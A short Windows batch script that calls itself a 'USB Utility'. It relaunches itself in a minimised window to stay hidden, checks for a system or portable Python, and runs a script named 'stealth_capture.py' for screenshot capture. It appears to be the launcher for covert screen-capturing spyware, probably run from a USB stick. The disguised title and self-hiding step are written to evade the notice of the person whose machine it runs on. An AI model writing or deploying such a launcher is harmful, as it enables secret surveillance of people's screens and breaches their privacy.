@echo off
title USB Utility
echo Starting USB utility...
echo Waiting for system to initialize...

:: Hide the command window
if not "%1"=="hidden" (
    start /min cmd /c "%~f0" hidden
    exit
)

:: Wait for system to fully initialize
timeout /t 10 /nobreak >nul

:: Check if Python is available
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Checking for portable Python...
    if exist "python\python.exe" (
        set PYTHON_PATH=python\python.exe
    ) else (
        echo Error: Python not available. Exiting.
        pause
        exit
    )
) else (
    set PYTHON_PATH=python
)

:: Run the main Python script
echo Starting screenshot capture utility...
%PYTHON_PATH% stealth_capture.py

:: Keep window open for debugging
echo Operation completed.
timeout /t 5